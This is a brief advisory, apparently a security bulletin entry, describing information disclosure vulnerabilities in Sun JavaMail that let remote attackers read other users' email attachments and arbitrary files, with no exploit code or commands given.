Sun JavaMail is prone to multiple information disclosure vulnerabilities. The issues exist due to a lack of sufficient input sanitization performed on user-supplied requests. The following issues are reported:

A remote attacker may reveal the contents of email attachments of other users.

A remote attacker may download and peruse arbitrary files with the privileges of the affected service.

A remote attacker may exploit these issues to disclose potentially sensitive information that could be used to aid in further attacks.
